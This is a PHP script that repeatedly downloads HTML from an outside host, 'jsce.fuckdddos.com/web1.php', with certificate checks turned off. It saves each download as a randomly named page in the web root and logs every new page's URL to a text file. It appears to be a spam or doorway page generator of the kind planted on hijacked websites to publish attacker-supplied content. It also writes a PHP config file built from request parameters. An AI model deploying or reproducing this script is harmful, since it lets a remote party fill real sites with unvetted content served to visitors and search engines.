<?php
date_default_timezone_set('PRC');
$start_time = time();
if(file_exists("./count_config.php")){
	include("./count_config.php");
}else{
	$total = !empty($_GET['total'])?is_numeric($_GET['total'])?$_GET['total']:0:0;
	$now = !empty($_GET['now'])?is_numeric($_GET['now'])?$_GET['now']:0:0;	
	file_put_contents("./count_config.php", "<?php\r\n ".'$total'."={$total};//总条数\r\n ".'$now'."={$now};//当前请求条数\r\n");
}


for ($now+=1;$now<=$total;$now++) { 
	if(time() - $start_time > 25){
		header('Location:http://'.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."?total={$total}");
	}
	$file = curl_get_content("http://jsce.fuckdddos.com/web1.php");
	$filePath = "/".date("YmdHis").mt_rand(10000000,99999999).".html";
	$re = file_put_contents(".".$filePath, $file);

	if (!$re && file_exists($filePath)) {
		return false;
	}else{
		$dirname = dirname($_SERVER['SCRIPT_NAME']);
		file_put_contents("./text.txt", $_SERVER["REQUEST_SCHEME"]."://".$_SERVER["SERVER_NAME"].$dirname.$filePath."\r\n",FILE_APPEND);
		file_put_contents("./count_config.php", "<?php\r\n ".'$total'."={$total};//总条数\r\n ".'$now'."={$now};//当前请求条数\r\n");
	}

	
}

if($now >= $total){
	echo "请求完成，当前请求总数为：{$total}条";
	@unlink("./count_config.php");
	exit;
}

function curl_get_content($url)
{
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_HEADER, 0);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书和hosts
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);
	$data = curl_exec($curl);
	curl_close($curl);
	return $data;
}